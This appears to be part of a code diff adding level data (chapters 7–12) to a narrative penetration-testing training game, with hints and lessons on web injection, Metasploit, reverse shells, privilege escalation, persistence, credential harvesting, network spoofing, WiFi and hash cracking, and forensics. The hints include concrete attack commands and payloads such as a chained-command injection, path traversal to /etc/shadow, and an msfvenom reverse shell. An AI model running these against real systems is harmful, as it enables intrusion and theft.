+  // ───────────────────────── CHAPTER 7 ─────────────────────────
+  "7.1": {
+    nar:"The application on .10 talks to a database, and it trusts what users type. SQL injection is what happens when input becomes code. Break the query by hand to prove it, then let a tool weaponise it.",
+    goal:"Prove the login is injectable by hand, then automate exploitation to dump the database.",
+    labels:{ sqliManual:"Bypass the login by breaking its SQL query", sqlmap:"Automate SQL injection to dump data" },
+    hints:["First break the query manually with a crafted input, then let an automated tool take over.","A classic auth bypass comments out the password check; sqlmap automates dumping.","Try admin'-- as the username, then: sqlmap -u 'http://10.0.0.10/login' --dbs"],
+    learned:"SQL injection happens when user input is concatenated into a query instead of parameterised. admin'-- closes the username string and comments out the rest, bypassing the password check entirely. sqlmap automates detection and dumping once you've confirmed the flaw by hand. The fix is always the same: parameterised queries / prepared statements. Never trust input as code.",
+    msg:"The login fell to a quote and two dashes, and the database dumped its tables.\nOne of them holds hashes. V's notes: 'the DB is where the keys are kept.'" },
+  "7.2": {
+    nar:"If SQLi turns input into database code, XSS turns input into browser code. Reflected, stored, and cookie-stealing — three flavours of making someone else's browser run your script. The danger scales with where the payload lands.",
+    goal:"Demonstrate a reflected payload, a stored payload, and one that steals a session cookie.",
+    labels:{ xssRefl:"Demonstrate a reflected script payload", xssStore:"Plant a stored script payload", xssCookie:"Craft a cookie-stealing payload" },
+    hints:["Reflected (bounces back in the response), stored (saved server-side), and cookie theft — three payloads.","The same script payload becomes STORED when you put it in something that gets saved — a comment, a message, a post.","Reflected: <script>alert(1)</script>  •  Stored: post the payload into a comment field, e.g. comment=<script>alert(1)</script>  •  Theft: a payload using document.cookie"],
+    learned:"Cross-site scripting injects script into pages other users load. Reflected XSS bounces a payload straight back in the response (needs a lure); stored XSS saves it server-side so it hits everyone who views the page (far worse); cookie theft via document.cookie hijacks sessions outright. The defence is output encoding and a Content-Security-Policy. XSS is about whose browser runs your code, and where it persists.",
+    msg:"Stored XSS means everyone who loads that page runs your script — including, eventually, an admin.\nV used a stored payload to capture the admin's session. Their notes describe the exact field." },
+  "7.3": {
+    nar:"When a web app builds file paths from user input, you can often climb out of where it expects you and read anything the server can — including files no web page should ever expose. Path traversal is trust in a filename, abused.",
+    goal:"Read a file outside the web root via traversal, and use the technique to reach a sensitive system file.",
+    labels:{ lfiBasic:"Read a file outside the web root", lfiShadow:"Reach a sensitive system file via inclusion" },
+    hints:["Climb out of the web directory with ../, then aim that at something sensitive.","../ sequences walk up the tree; point them at a known system file.","?file=../../../../etc/passwd then aim deeper at /etc/shadow"],
+    learned:"Local File Inclusion / path traversal abuses code that builds a path from input: ../ sequences escape the intended directory and read arbitrary files (/etc/passwd, config files with DB creds, even logs you can poison into code execution). The fix is to never build filesystem paths from user input, and to canonicalise and whitelist. A filename is input — and input is never trustworthy.",
+    msg:"Traversal walked you out of the web root and into the system's own files.\nV reached the credential store this way. The technique that reads /etc/passwd reads anything." },
+  "7.4": {
+    nar:"The worst input flaw of all: when user input reaches the system shell. Command injection turns a web form into a terminal on the server. Confirm it with a chained command, then upgrade it into a real shell.",
+    goal:"Confirm command injection by chaining a command, then turn it into an interactive shell.",
+    labels:{ cmdInj:"Confirm injection by chaining a command", cmdShell:"Escalate injection into a real shell" },
+    hints:["First prove your input runs as a command, then use it to spawn a shell back to you.","Shell metacharacters like ; chain a second command onto the first. Send the injection to the vulnerable endpoint and ask it to run id.","Confirm with: curl http://10.0.0.10/ping.php -d 'ip=127.0.0.1; id'  — then escalate to a reverse shell"],
+    learned:"Command injection occurs when input reaches a system shell call; metacharacters (; && | $()) chain your own commands onto the intended one. ; id confirms execution; from there a reverse shell gives interactive control. It's often the fastest path from web flaw to full host compromise. The fix: never pass input to a shell — use parameterised APIs and strict allow-lists.",
+    msg:"; id returned root's id — the web service runs as root, and now so do you on it.\nV's reverse shell landed here. This is the foothold the whole engagement turned on." },
+  "7.5": {
+    nar:"Sometimes there's no clever bug — just a weak password or a default no one changed. Online brute-forcing and default-credential checks are unglamorous and devastatingly effective. Try the obvious before the elaborate.",
+    goal:"Brute-force a login against a wordlist, and test for default credentials.",
+    labels:{ hydra:"Brute-force a login with a wordlist", defCreds:"Test for default credentials" },
+    hints:["Throw a wordlist at the login, and separately just try the obvious factory defaults.","hydra automates credential guessing; default creds are things like admin/admin.","hydra -l admin -P rockyou.txt 10.0.0.10 http-post-form ... — then try admin/admin"],
+    learned:"hydra automates online password guessing against a service and a wordlist (rockyou.txt being the canonical one); default-credential checks just try the factory pairs (admin/admin, root/toor). Rate-limiting and lockouts are the defence, plus simply changing defaults. It's not elegant, but weak and default credentials remain one of the most common real-world breaches — always try the obvious first.",
+    msg:"A weak password fell to the wordlist. No exploit, no cleverness — just a password someone never strengthened.\nV's notes are blunt about it: 'the front door was unlocked the whole time.'" },
+  "7.6": {
+    nar:"Modern apps add modern flaws. SSRF makes the server fetch URLs for you — including internal ones you can't reach. JWTs carry trust in a token you can sometimes forge. Newer surface, same root cause: misplaced trust.",
+    goal:"Make the server make a request on your behalf, reach an internal-only endpoint through it, and decode a session token.",
+    labels:{ ssrf:"Make the server fetch a URL for you", ssrfMeta:"Reach an internal-only endpoint via SSRF", jwtDecode:"Decode a JSON Web Token" },
+    hints:["Force the server to fetch a URL, point that at something internal, and separately decode a token.","SSRF abuses a URL parameter; point it at internal addresses; a JWT is base64 you can decode.","Set a url= param to an internal address / cloud metadata IP, then base64-decode the JWT's middle section"],
+    learned:"SSRF (Server-Side Request Forgery) tricks the server into making requests you can't — reaching internal services and cloud metadata endpoints (the classic 169.254.169.254 credential leak). JWTs are base64-encoded claims; the header and payload aren't encrypted, only signed — decode them freely, and weak or 'none' signature handling lets you forge them. Both are failures of trust boundaries in modern stacks.",
+    msg:"SSRF reached an internal endpoint the firewall thought was unreachable, and the JWT decoded to reveal its claims.\nThat internal endpoint is part of V's escape route. The pieces are connecting." },
+
+  // ───────────────────────── CHAPTER 8 ─────────────────────────
+  "8.1": {
+    nar:"Metasploit is the industrial framework — a searchable arsenal of exploits and payloads wired into one console. Learn its loop: search, select, configure, fire. It's the backbone of countless real engagements.",
+    goal:"Start the framework, search for a module, configure it, and run it.",
+    labels:{ msfStart:"Launch the Metasploit console", msfSearch:"Search for an exploit module", msfSet:"Configure the module's options", msfRun:"Launch the configured exploit" },
+    hints:["Start the console, search the arsenal, set your options, then fire — the core msfconsole loop.","msfconsole starts it; search finds modules; set configures; exploit runs.","msfconsole — search type:exploit — set RHOSTS 10.0.0.10 — exploit"],
+    learned:"Metasploit's workflow is universal: msfconsole to start, search to find a module, use to select, set for options (RHOSTS, LHOST, payload), then exploit/run. It standardises the exploit-to-payload-to-session pipeline so you focus on the engagement, not the plumbing. Knowing the loop matters more than memorising modules — every module follows the same shape.",
+    msg:"The framework is live and a module is set against .10.\nV's msfconsole history is still on disk. They knew exactly which module to reach for." },
+  "8.2": {
+    nar:"A successful exploit can give you Meterpreter — an advanced payload that lives in memory and turns the session into a remote control. Survey the host, confirm your privileges, climb to SYSTEM, and lift the password hashes.",
+    goal:"Survey the compromised host, confirm your user, attempt to elevate, and dump the password hashes.",
+    labels:{ sysinfo:"Survey the compromised host", getuid:"Confirm your current privileges", getsys:"Attempt to elevate to SYSTEM", hashdump:"Dump the password hashes" },
+    hints:["Survey, check who you are, try to elevate, then dump hashes — the post-exploitation survey.","sysinfo profiles the host; getuid shows your context; getsystem elevates; hashdump lifts hashes.","sysinfo — getuid — getsystem — hashdump"],
+    learned:"Meterpreter is an in-memory post-exploitation payload: sysinfo profiles the host, getuid shows your privilege context, getsystem attempts automatic elevation, and hashdump extracts password hashes for offline cracking and pass-the-hash. Living in memory makes it stealthier than dropping binaries. This is the survey-and-harvest phase — you've got a session, now you learn the host and gather everything reusable.",
+    msg:"Hashes dumped. They go in your workspace next to the ones the database leaked.\nV collected hashes obsessively. You're starting to see why — they're keys to other doors." },
+  "8.3": {
+    nar:"You can't always use a framework session — sometimes you must hand-craft the payload and deliver it yourself. msfvenom builds standalone payloads for any target and format. Know how to list the options and generate one.",
+    goal:"List available payloads, and generate a standalone payload for a target platform.",
+    labels:{ msfvList:"List the available payloads", msfvLinux:"Generate a standalone payload" },
+    hints:["First see what payloads exist, then generate one for a specific platform and format.","msfvenom --list payloads lists them; -p PAYLOAD LHOST=.. -f FORMAT builds one.","msfvenom --list payloads — msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf"],
+    learned:"msfvenom generates standalone payloads outside the console: choose a payload (-p), set callback details (LHOST/LPORT), pick a format (-f elf/exe/raw/python). You use it when you're delivering the payload through your own exploit, a file upload, or a phishing lure rather than a Metasploit module. Pair it with a matching listener to catch the shell. It's the payload factory behind everything.",
+    msg:"You built a payload by hand and a listener to catch it.\nV preferred hand-built payloads — quieter, and they bypass the signatures the framework's defaults trip." },
+  "8.4": {
+    nar:"Frameworks fail; public exploits don't always work out of the box. Manual exploitation is finding the code, reading it, fixing its target details, and running it yourself. This is the skill that separates operators from button-pushers.",
+    goal:"Find a matching public exploit, copy it locally, and run it against the target after reviewing it.",
+    labels:{ srchFind:"Find a matching public exploit", srchCopy2:"Copy the exploit to your workspace", runExpl:"Run the exploit against the target" },
+    hints:["Find it, copy it out, read and adjust it, then run it — the manual exploitation chain.","searchsploit finds and -m copies; run the script with the target as an argument.","searchsploit <software> — searchsploit -m <id> — python3 exploit.py 10.0.0.10"],
+    learned:"Manual exploitation is the real craft: find a public exploit (searchsploit/Exploit-DB), read it before running it (blindly running exploit code is how you get backdoored or crash the target), adjust hardcoded IPs/ports/offsets, then execute. Always understand what an exploit does first. This is the difference between knowing why something works and merely that a tool said 'success'.",
+    msg:"You read the exploit, fixed its target details, and it worked.\nV's annotations in the margins of this exact script taught you what to change. You're collaborating with a ghost." },
+  "8.5": {
+    nar:"The exploit's reward is a shell — but a raw reverse shell is fragile and dumb. Learn the variants, catch one on a listener, then upgrade it into a stable, interactive TTY. A broken shell that dies on Ctrl-C wins nobody an engagement.",
+    goal:"Study the reverse-shell variants, open a listener to catch one, and stabilise the shell once it lands.",
+    labels:{ readShells:"Study the reverse-shell variants", ncListen2:"Open a listener to catch a shell", stableShell:"Upgrade the shell to a stable TTY" },
+    hints:["Learn the variants, open a catcher, then upgrade the raw shell into a real terminal.","There's a shells reference to read; nc -lvnp catches; a python pty one-liner stabilises.","cat shells.txt — nc -lvnp 4444 — python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
+    learned:"A reverse shell connects from the target back to your listener (it beats firewalls that block inbound). bash, python, nc and others each have a one-liner. nc -lvnp catches it — but the raw shell has no job control, no tab-completion, and dies on Ctrl-C. The python3 pty.spawn trick (plus stty raw) upgrades it to a real TTY. A stable shell is the difference between a foothold and a frustration.",
+    msg:"You caught the shell and turned it into a real terminal.\nThis is the exact technique V used to hold their session on .10. From here, they went for root." },
+
+  // ───────────────────────── CHAPTER 9 ─────────────────────────
+  "9.1": {
+    nar:"You have a foothold — as a low user. Privilege escalation turns that into root. Re-check sudo, hunt SUID binaries, automate the search, then exploit a known-abusable binary. This is where most of the real game is played.",
+    goal:"Re-examine your sudo rights, hunt SUID binaries, run an automated enumerator, and exploit an abusable binary.",
+    labels:{ sudoL2:"Re-examine what you may run as root", suidsFind:"Hunt for SUID binaries", linpeas:"Run an automated privesc enumerator", gtfobins2:"Exploit an abusable binary to escalate" },
+    hints:["Check sudo again, find SUID binaries, automate the hunt, then abuse one — the privesc loop.","sudo -l, then find -perm -u=s, then linpeas, then look the binary up on GTFOBins.","sudo -l — find / -perm -u=s -type f 2>/dev/null — linpeas.sh — cat gtfobins.txt"],
+    learned:"Privilege escalation hunts for misconfigurations: sudo entries you can abuse, SUID binaries that run as root, writable cron scripts, weak file permissions. linpeas automates the whole sweep and colour-codes findings. GTFOBins is the reference — it lists exactly how each common binary (find, vim, less) can be abused to spawn a root shell when it's SUID or sudo-allowed. Find the misconfig, look up the abuse, become root.",
+    msg:"A SUID binary on GTFOBins gave you a root shell. You're root on .10 now.\nThis is as far as V's notes on .10 go. Everything past here, they did somewhere else." },
+  "9.2": {
+    nar:"Root is temporary unless you make it last. Persistence survives reboots and patched bugs: an SSH key you control, a cron job that re-establishes access, a web shell tucked into the app. (Where authorised — persistence is also exactly what defenders hunt for.)",
+    goal:"Plant an SSH key for re-entry, establish a cron-based callback, and drop a web shell.",
+    labels:{ sshKey:"Plant an SSH key for re-entry", cronBack:"Establish a scheduled callback", webShell:"Drop a web shell in the app" },
+    hints:["Three ways back in: a key you own, a scheduled job, and a shell hidden in the web app.","Append your public key to authorized_keys; add a cron job; write a web shell.","echo your public key >> ~/.ssh/authorized_keys — add a crontab callback — drop a web shell in the docroot"],
+    learned:"Persistence keeps access through reboots and fixes: an attacker-controlled key in authorized_keys, a cron job that phones home, a web shell in the document root. On the defensive side this section is a hunting checklist — these are precisely the artefacts incident responders look for. Authorised persistence must be documented and removed at engagement end; undocumented persistence is how breaches become long-term compromises.",
+    msg:"Three independent ways back in. Lose one, keep the others.\nV planted persistence too — which means there may still be a way they left themselves back into this box. Find it." },
+  "9.3": {
+    nar:"Root's real prize is everyone else's credentials. The shadow file holds the hashes, shell histories leak typed passwords, and config files across the box hold reused secrets. Harvest them all — credentials are the keys to the next machine.",
+    goal:"Read the now-accessible shadow file, mine shell history for credentials, and grep configs for secrets.",
+    labels:{ shadowRead:"Read the password hash store", histCreds:"Mine shell history for credentials", grepCreds:"Search configs for reused secrets" },
+    hints:["The hash store you couldn't read before, the commands people typed, and secrets in configs — three sources.","As root, cat /etc/shadow; read ~/.bash_history; grep -ri password across config dirs.","cat /etc/shadow — cat ~/.bash_history — grep -ri 'password' /etc /var/www 2>/dev/null"],
+    learned:"/etc/shadow holds password hashes (readable only as root — which is why you needed escalation first) for offline cracking. Shell history files capture passwords typed on command lines (a chronic mistake). Config files leak DB and service creds in plaintext. Harvested credentials get reused — people reuse passwords across systems — so the creds from one box are the front-door keys to the next. This is how a single foothold becomes a whole network.",
+    msg:"shadow, history, and a config file all gave up credentials — and one of them is reused on an internal host.\nV's history shows them finding this same reused password. It's the thread that leads off this machine entirely." },
+  "9.4": {
+    nar:"One machine is rarely the goal. Lateral movement uses what you harvested here to reach deeper hosts the firewall thought were safe — SSH with stolen creds, then tunnels and proxies to route your tools through the box you own into the network you don't.",
+    goal:"Move to an internal host with harvested credentials, set up a proxy through your foothold, and route tools through it.",
+    labels:{ sshLat:"Move to an internal host with stolen creds", socksPrx:"Open a proxy through your foothold", proxychain:"Route tools through the proxy" },
+    hints:["Reuse creds to reach a new host, open a tunnel through your foothold, then send tools through it.","ssh with the reused password; ssh -D opens a SOCKS proxy; proxychains routes tools through it.","ssh user@10.0.0.20 — ssh -D 1080 user@foothold — proxychains nmap ..."],
+    learned:"Lateral movement pivots deeper: reused credentials open the next host; a SOCKS proxy (ssh -D) through your foothold lets your tools reach the internal network as if you were inside it; proxychains forces any tool down that tunnel. This is how attackers cross from a single exposed box into a whole internal estate — and why network segmentation and unique credentials matter so much to defenders.",
+    msg:"You pivoted to an internal host the firewall believed was unreachable from outside.\nThis is the network V disappeared into. The escape route runs through here, not the front door." },
+  "9.5": {
+    nar:"On authorised engagements you clean up after yourself — and you must understand anti-forensics to detect it as a defender. Clearing history, tampering with logs, altering timestamps: know exactly what an intruder does so you can recognise the traces they miss.",
+    goal:"Clear shell history, understand log tampering, and understand timestamp manipulation.",
+    labels:{ histClear:"Clear your shell history", logTamper:"Understand how logs get tampered", timestamp:"Understand timestamp manipulation" },
+    hints:["Clear the command history, and study how logs and timestamps get altered.","history -c clears history; study how log lines and file timestamps are modified.","history -c — study log tampering — study timestamp (touch -t) manipulation"],
+    learned:"Anti-forensics covers tracks: history -c clears the shell record, log entries get selectively deleted, timestamps get reset with touch -t. For an authorised tester this is scoped cleanup; for a defender it's a curriculum — knowing these techniques is how you spot the gaps they leave (a cleared history is itself suspicious; logs shipped off-host can't be edited locally; filesystem timelines reveal touch tampering). You learn the offence to build the defence.",
+    msg:"You understand how an intruder erases themselves now — which means you can spot where they failed to.\nV cleaned up well. But not perfectly. The gap they left is your way forward." },
+
+  // ───────────────────────── CHAPTER 10 ─────────────────────────
+  "10.1": {
+    nar:"On a local network, whoever controls ARP controls the traffic. ARP spoofing tells two machines you're each other, putting you in the middle of their conversation. The foundation of every on-path attack starts here.",
+    goal:"Poison the ARP cache between two hosts, enable forwarding so traffic still flows, and run an interception tool.",
+    labels:{ arpSpoof:"Poison the ARP mapping between two hosts", ipForward:"Enable forwarding so traffic still flows", ettercap:"Run an interception tool" },
+    hints:["Lie about MAC addresses, keep traffic flowing through you, then intercept it — three steps.","arpspoof poisons; enabling ip_forward keeps traffic moving; ettercap intercepts.","arpspoof -i eth0 -t victim gateway — echo 1 > /proc/sys/net/ipv4/ip_forward — ettercap -T -M arp"],
+    learned:"ARP has no authentication, so ARP spoofing lets you claim to be the gateway: both victim and router send their traffic to you. Enabling IP forwarding makes you a transparent relay (so the victim notices nothing), and a tool like ettercap intercepts the flow. This is the basis of local man-in-the-middle. Defences are dynamic ARP inspection and, above all, encryption — which is why the next stage matters.",
+    msg:"You sit between two machines now; their traffic flows through you.\nV used this on the internal segment. Position is power on a LAN." },
+  "10.2": {
+    nar:"Being in the middle is only useful if you can read what passes. SSL stripping and intercepting proxies try to peel back encryption or sit inside the TLS conversation — and where they fail is the proof that encryption is what actually protects users.",
+    goal:"Intercept traffic in transit, and run an interception proxy to inspect it.",
+    labels:{ tcpMitm:"Inspect traffic passing through you", mitmproxy:"Run an interception proxy" },
+    hints:["Watch the intercepted traffic, then run a proper interception proxy to inspect and modify it.","tcpdump reads what flows through; mitmproxy gives an interactive interception proxy.","tcpdump -i eth0 -A — mitmproxy --mode transparent"],
+    learned:"Once on-path, you inspect: tcpdump reads cleartext, and mitmproxy provides an interactive proxy to view and modify flows. SSL stripping tries to downgrade HTTPS to HTTP — but HSTS and modern browsers largely defeat it, and properly encrypted traffic stays opaque. That's the lesson cutting both ways: MITM is devastating against cleartext and nearly useless against correct TLS. Encryption is the control that holds.",
+    msg:"Cleartext gave itself up instantly; the properly-encrypted flows stayed shut.\nV's notes underline it: 'TLS done right was the one thing I couldn't break.'" },
+  "10.3": {
+    nar:"WiFi is just radio you can capture. Put the card in monitor mode, watch the airspace, knock a client off to capture its reconnection handshake, then crack that handshake offline. The whole attack happens without ever joining the network.",
+    goal:"Enter monitor mode, survey the airspace, force a handshake capture, and crack it offline.",
+    labels:{ airmon:"Put the wireless card into monitor mode", airodump:"Survey the wireless airspace", deauth:"Force a client to reconnect", aircrack:"Crack the captured handshake" },
+    hints:["Monitor mode, survey, knock a client off to capture the handshake, then crack it — four steps.","airmon-ng enables monitor mode; airodump-ng surveys/captures; aireplay-ng deauths; aircrack-ng cracks.","airmon-ng start wlan0 — airodump-ng wlan0mon — aireplay-ng --deauth — aircrack-ng capture.cap -w rockyou.txt"],
+    learned:"WPA2 cracking is offline: airmon-ng sets monitor mode, airodump-ng captures the 4-way handshake, a deauth (aireplay-ng) forces a client to reconnect so you capture that handshake faster, and aircrack-ng cracks it against a wordlist. You never join the network — you capture radio and crack later. The defence is a long, non-dictionary passphrase (WPA2's weakness is the password, not the protocol) and WPA3.",
+    msg:"You captured the handshake and cracked it against the wordlist.\nThis is squarely your home turf — the pocket Kali rig, the AR9271 sniffing the air. V would have approved." },
+  "10.4": {
+    nar:"DNS decides where names point. Poison it and you decide where victims go. Spoofing responses redirects traffic to machines you control — phishing, interception, or just quietly steering a target into a trap.",
+    goal:"Run a spoofing DNS server, and poison a name to point where you choose.",
+    labels:{ dnschef:"Run a spoofing DNS server", dnsPois:"Redirect a name to a host you control" },
+    hints:["Stand up a lying DNS server, then make a name resolve to your address.","dnschef runs a spoofing resolver; configure it to poison a domain to your IP.","dnschef --fakeip 10.0.0.5 — poison target.machine to your host"],
+    learned:"DNS spoofing/poisoning supplies forged answers so a victim resolves a name to your server instead of the real one — enabling phishing pages, traffic interception and redirection. Tools like dnschef make the host lie. The defences are DNSSEC (signed records), validating resolvers, and not trusting names blindly. Whoever controls name resolution controls where users actually go, regardless of what they typed.",
+    msg:"You bent name resolution to your will — the victim's traffic goes where you say.\nV used DNS to redirect the escape signal. Control the names, control the path out." },
+  "10.5": {
+    nar:"Wireless isn't only WiFi. Bluetooth devices announce themselves constantly, and most were designed assuming nobody's listening. Scan classic and low-energy devices to see how much an unguarded radio gives away.",
+    goal:"Scan for classic Bluetooth devices, run a dedicated scanner, and scan for Bluetooth Low Energy devices.",
+    labels:{ hciscan:"Scan for classic Bluetooth devices", btscanner:"Run a dedicated Bluetooth scanner", hciBle:"Scan for Bluetooth Low Energy devices" },
+    hints:["A classic scan, a dedicated scanner, and a low-energy scan — three Bluetooth sweeps.","hcitool scan finds classic devices; btscanner is a dedicated tool; hcitool lescan finds BLE.","hcitool scan — btscanner — hcitool lescan"],
+    learned:"Bluetooth recon: hcitool scan finds discoverable classic devices, btscanner profiles them, and hcitool lescan sweeps for Bluetooth Low Energy (everywhere now — wearables, beacons, locks). Many devices leak identifiers, services and even location patterns to a passive listener. The lesson is that any radio is an attack surface; cheap BLE-capable boards make this trivial to experiment with.",
+    msg:"The airspace is full of devices that assumed nobody was listening.\nEvery radio is a surface. V's notes end Chapter 10 with: 'the machine talks more than it knows.'" },
+
+  // ───────────────────────── CHAPTER 11 ─────────────────────────
+  "11.1": {
+    nar:"You've harvested a pile of hashes. A hash is a one-way fingerprint — you don't reverse it, you guess inputs until one matches. Identify the type, then throw a wordlist at it with a GPU-grade cracker. This is real, and exactly the workflow run on dedicated cracking rigs.",
+    goal:"Study how hashing works, identify a hash's type, then crack it two different ways.",
+    labels:{ hashInfo:"Study how password hashing works", hashId:"Identify the type of a hash", hashcat:"Crack a hash with a GPU cracker", johnCrack:"Crack a hash with John the Ripper" },
+    hints:["Understand hashing, identify the format, then crack with two different tools.","Read the hashing notes; hashid/hash-identifier names the type; hashcat and john crack it.","cat hashing.txt — hashid <hash> — hashcat -m 0 hash.txt rockyou.txt — john --wordlist=rockyou.txt hash.txt"],
+    learned:"Hashes are one-way: cracking means hashing guesses until one matches the target. Identifying the algorithm first is essential — hashcat's -m mode must match (0=MD5, 1000=NTLM, 1800=sha512crypt). hashcat is GPU-accelerated and brutally fast; John the Ripper is the flexible CPU classic. Wordlists like rockyou.txt do most of the work because humans pick predictable passwords.",
+    msg:"The hash fell — a human-chosen password, guessed in seconds.\nV cracked a hash here that unlocks something later. Keep the plaintext. You'll need it." },
+  "11.2": {
+    nar:"Plain wordlists run out. Advanced cracking shapes the guesses: rules mutate words the way people do (Password becomes P@ssw0rd!), masks brute-force specific patterns, and Windows NTLM hashes get their own treatment. Crack smarter, not just longer.",
+    goal:"Apply mutation rules, run a targeted mask attack, and crack a Windows NTLM hash.",
+    labels:{ hashRules:"Mutate the wordlist with rules", hashMask:"Brute-force a known pattern with a mask", ntlmCrk:"Crack a Windows NTLM hash" },
+    hints:["Mutate words with rules, brute-force a pattern with a mask, and crack an NTLM hash.","hashcat -r applies rules; -a 3 with a mask brute-forces patterns; -m 1000 is NTLM.","hashcat -r best64.rule ... — hashcat -a 3 ?u?l?l?l?d?d ... — hashcat -m 1000 ntlm.txt rockyou.txt"],
+    learned:"When wordlists fail, you shape guesses: rule files (best64, etc.) apply human-like mutations to each word; mask attacks (-a 3) brute-force a known structure (?u uppercase, ?l lower, ?d digit, ?s symbol) so you don't waste time on impossible combinations; and NTLM (-m 1000) is the Windows hash you'll meet constantly in AD. Smart cracking constrains the search space to how people actually build passwords.",
+    msg:"A masked, rule-mutated attack cracked what the plain wordlist couldn't.\nV's cracking notes are dense here. The plaintext you just recovered matters for the domain chapter." },
+  "11.3": {
+    nar:"Crackers break weak secrets; understanding encryption is knowing what holds. Symmetric encryption, the TLS exchange, and signed/encrypted messaging — learn how data is actually protected so you know what's worth attacking and what isn't.",
+    goal:"Encrypt and decrypt data symmetrically, inspect a TLS handshake, and use symmetric encryption with a passphrase.",
+    labels:{ opensslEnc:"Encrypt and decrypt data symmetrically", opensslTls:"Inspect a live TLS handshake", gpgSym:"Encrypt a file with a passphrase" },
+    hints:["Symmetric encrypt/decrypt, inspect a TLS handshake, and passphrase-encrypt a file — three crypto operations.","openssl enc does symmetric crypto; openssl s_client shows the TLS handshake; gpg -c encrypts with a passphrase.","openssl enc -aes-256-cbc ... — openssl s_client -connect host:443 — gpg -c secret.txt"],
+    learned:"openssl enc does symmetric encryption (one shared key, fast, for bulk data); openssl s_client reveals a TLS handshake (cert chain, ciphers, the asymmetric key-exchange that bootstraps a symmetric session key); gpg -c encrypts a file under a passphrase. Knowing how crypto is built tells you where the soft spots are — almost never the algorithm, almost always key management, weak passphrases, or implementation mistakes.",
+    msg:"You can protect data now, not just attack it. The strong crypto held; only the weak passphrase was ever the risk.\nV encrypted something on this box. You'll need a passphrase you cracked earlier to open it." },
+  "11.4": {
+    nar:"Some secrets hide in plain sight. Steganography buries data inside ordinary files; strings and carving tools pull hidden payloads back out. The most important habit: always look inside a file, never trust what its extension claims.",
+    goal:"Carve hidden data out of a file, extract a steganographic payload, and pull readable strings from a binary.",
+    labels:{ binwalk:"Carve hidden data out of a file", steghide:"Extract a steganographic payload", strings1:"Pull readable strings from a binary" },
+    hints:["Carve embedded files out, extract a hidden payload, and scrape readable text from a binary.","binwalk finds/extracts embedded files; steghide extracts hidden data; strings dumps text.","binwalk -e image.png — steghide extract -sf image.jpg — strings binary"],
+    learned:"Steganography hides data inside carrier files (an archive appended to a PNG, a message in a JPEG's bytes). binwalk detects and carves embedded files; steghide extracts payloads (often passphrase-protected); strings dumps the human-readable text from any binary — frequently revealing hardcoded creds, URLs, and flags. The habit that matters: a file's extension is a claim, not a fact. Always look inside.",
+    msg:"A file pretending to be an image had another file buried inside it.\nV hid a key fragment in exactly this way. What looks like a photo on this box may not be one." },
+
+  // ───────────────────────── CHAPTER 12 ─────────────────────────
+  "12.1": {
+    nar:"Now you turn defender. Every action leaves a trace in the logs — failed logins, sudo use, service events. Reading logs is how you reconstruct what an intruder did. Build the one-line pipeline that turns a noisy log into a ranked list of attackers.",
+    goal:"Read the auth log, read the system log, extract the failed logins, and review the journal.",
+    labels:{ authLog:"Read the authentication log", syslogC:"Read the system log", grepFail:"Extract the failed login attempts", journal:"Review the systemd journal" },
+    hints:["Read the auth log and syslog, filter to the failures, and check the journal — four reads.","auth.log holds logins; syslog holds system events; grep 'Failed' isolates failures; journalctl reads the journal.","cat /var/log/auth.log — cat /var/log/syslog — grep Failed /var/log/auth.log — journalctl -xe"],
+    learned:"Logs are the defender's evidence: /var/log/auth.log records authentication (failed and successful logins, sudo), /var/log/syslog general events, and journalctl reads systemd's structured journal. The killer pipeline — grep Failed auth.log | cut/awk the IP | sort | uniq -c | sort -rn — ranks attacking IPs by attempts in one line. The same pipe skills you learned for offence are how you read an attack after the fact.",
+    msg:"The auth log shows a flood of failed logins from one IP — then one success. That's the breach, written down.\nV's intrusion is in these logs too, if you read carefully enough. The machine remembers everyone." },
+  "12.2": {
+    nar:"When the evidence is a disk, not a live system, you image it bit-for-bit and carve the artefacts out — deleted files, embedded data, hidden strings. Forensics is patient archaeology on storage.",
+    goal:"Image a disk, carve files out of the image, and pull strings from raw storage.",
+    labels:{ ddImage:"Make a bit-for-bit disk image", foremost:"Carve files out of the image", strDisk:"Pull strings from raw storage" },
+    hints:["Image the disk bit-for-bit, carve files from the image, then scrape strings from it.","dd images block devices; foremost carves files by signature; strings scrapes text.","dd if=/dev/sdb of=disk.img — foremost -i disk.img — strings disk.img | less"],
+    learned:"Disk forensics works on copies: dd makes a bit-for-bit image (you never work on the original — chain of custody), foremost/scalpel carve files back out by header signature even after deletion (deleting only unlinks; the bytes remain until overwritten), and strings surfaces readable text from raw storage. This is how deleted evidence, hidden partitions and residual secrets get recovered. Patience and exactness are the whole discipline.",
+    msg:"You carved a deleted file back out of the disk image. Deletion isn't erasure — the bytes lingered.\nV deleted something here. It may still be carvable. Nothing is ever truly gone until it's overwritten." },
+  "12.3": {
+    nar:"When the alarm goes off for real, you follow a process: identify what's happening, contain it before it spreads, then hunt for indicators of compromise across the system. Calm method beats panic every time.",
+    goal:"Review the IR process, understand containment, and hunt for indicators of compromise.",
+    labels:{ irProcess:"Review the incident-response process", contain:"Understand containment", iocHunt:"Hunt for indicators of compromise" },
+    hints:["Read the IR process, understand how to contain a live incident, then hunt for IOCs.","There's an ir_process reference; containment isolates the host; hunt for known-bad indicators.","cat ir_process.txt — study containment — hunt for IOCs (bad IPs, hashes, files)"],
+    learned:"Incident response runs a sequence — prepare, identify, contain, eradicate, recover, learn. Containment (isolating a host, cutting network) stops spread before cleanup. IOC hunting searches for known-bad indicators (malicious IPs, file hashes, suspicious processes, rogue cron jobs, unexpected keys in authorized_keys) across the estate. The discipline is doing it methodically and documenting everything — assume you may have to testify about every action later.",
+    msg:"You worked the incident like a professional: identify, contain, hunt — not panic.\nThe IOCs you hunted match V's persistence artefacts. You're now investigating the very intruder whose trail you've been following." },
+  "12.4": {
+    nar:"The richest evidence vanishes at shutdown — it's in RAM. Memory forensics recovers running processes, command histories and secrets straight from a memory image, including things that never touched the disk at all.",
+    goal:"List processes from a memory image, recover shell history from memory, and pull strings from raw memory.",
+    labels:{ volPslist:"List processes from a memory image", volBash:"Recover shell history from memory", strMem:"Pull strings from raw memory" },
+    hints:["List processes from the memory image, recover the shell history from it, then scrape strings.","Volatility's pslist lists processes; its bash plugin recovers history; strings scrapes raw memory.","volatility -f mem.img pslist — volatility -f mem.img linux_bash — strings mem.img | grep -i pass"],
